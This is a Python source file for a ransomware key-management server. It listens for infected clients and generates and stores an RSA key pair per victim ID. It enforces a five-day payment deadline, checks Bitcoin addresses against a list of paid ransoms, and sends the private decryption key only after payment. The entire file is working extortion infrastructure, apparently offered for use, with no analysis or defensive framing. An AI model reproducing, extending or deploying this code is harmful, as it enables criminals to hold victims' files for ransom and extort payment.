import socket, os, secrets, json, base64, rsa
from datetime import datetime, timedelta

SERVER_ADDRESS = ("0.0.0.0", 33800)
VICTIMS_FILE_PATH = "victims.json"
ADDRESSES_THAT_PAID_PATH = "allowed_addresses.txt"
ALREADY_USED_ADDRESSES_PATH = "already_checked_addresses.txt"
DATE_FORMAT = "%Y-%m-%d %H:%M:%S.%f"
MAX_DAYS_TO_PAY = 5

def create_id(size=16):
    return secrets.token_hex(size)

def start_server(server_address):

    # Create socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(server_address)

    # Listen
    server_socket.listen(10)
    print("Server is running...")

    while True:
        client, client_address = server_socket.accept()    # Accept connections

        try:
            msg_data = client.recv(4096).decode()

            print(f"Received: {client_address} - {msg_data}")


            if msg_data.startswith("/to-server/"):
                
                if msg_data.startswith("/to-server/ new"):
                    
                    # New keys and ID
                    public_key, private_key = rsa.newkeys(2048)
                    public_key_pem = public_key.save_pkcs1(format='PEM')
                    private_key_pem = private_key.save_pkcs1(format='PEM')
                    id = create_id(16)
                    expiration_date_string = str(datetime.now()+timedelta(days=MAX_DAYS_TO_PAY))

                    response = f"/to-client/ publickey={base64.b64encode(public_key_pem).decode()} id={id} date={expiration_date_string}"
                    client.sendall(response.encode())

                    print(f"Sent: {response}")

                    # Append to victims.json
                    with open(VICTIMS_FILE_PATH, "r") as f:
                        victims_dict = json.load(f)

                    with open(VICTIMS_FILE_PATH, "w") as f:
                        victims_dict[id] = {"public_key": public_key_pem.decode(), "private_key": private_key_pem.decode(), "date": expiration_date_string}    # example : {"testid": {"public_key": "testpublickey", "private_key": "testprivatekey"}}
                        json.dump(victims_dict, f, indent=4)


                elif msg_data.startswith("/to-server/ check"):
                    try:
                        # Locate payment address (BTC) and ID in the string and store them
                        payment_address = msg_data[(msg_data.find("payaddress=")+11):(msg_data.find("id=")-1)]
                        id = msg_data[(msg_data.find("id=")+3):]
                    except:
                        print("Can't find Payment Address/ID in the request!")

                    with open(ADDRESSES_THAT_PAID_PATH, 'r') as f:
                        addresses_that_paid = f.read()

                    with open(ALREADY_USED_ADDRESSES_PATH, 'r') as f:
                        used_addresses = f.read()

                    if f"_start_{payment_address}_end_".lower() in addresses_that_paid.lower() and f"_start_{payment_address}_end_".lower() not in used_addresses.lower():    # Check if the payment address has payed the ransom and make sure this address hasn't already been used to decrypt a victim's files
                        
                        with open(VICTIMS_FILE_PATH, "r") as f:
                            victims_dict = json.load(f)

                        try:
                            private_key_pem = victims_dict[id]["private_key"]
                            private_key_pem_bytes = private_key_pem.encode()
                            expiration_date_string = victims_dict[id]["date"]
                            expiration_date = datetime.strptime(expiration_date_string, DATE_FORMAT)
                            current_date = datetime.now()

                            if current_date < expiration_date:    # Check if the user paid before the end date
                                response = f"/to-client/ privatekey={base64.b64encode(private_key_pem_bytes).decode()}"
                                client.sendall(response.encode())

                                print(f"Sent: {response}")

                                # Add address to already used address file
                                with open(ALREADY_USED_ADDRESSES_PATH, 'a') as f:
                                    f.write(f"\n_start_{payment_address}_end_")

                        except: pass

                elif msg_data.startswith("/to-server/ askdate"):
                    try:
                        # Locate ID in the string and store it
                        id = msg_data[(msg_data.find("id=")+3):]
                    except:
                        print("Can't find Payment Address/ID in the request!")

                    with open(VICTIMS_FILE_PATH, "r") as f:
                            victims_dict = json.load(f)

                    date_string = victims_dict[id]["date"]
                    
                    # Send payment expiration date to client
                    response = f"/to-client/ date={date_string}"
                    client.sendall(response.encode())

                    print(f"Sent: {response}")

        finally:
            client.close()

if __name__ == "__main__":
    start_server(SERVER_ADDRESS)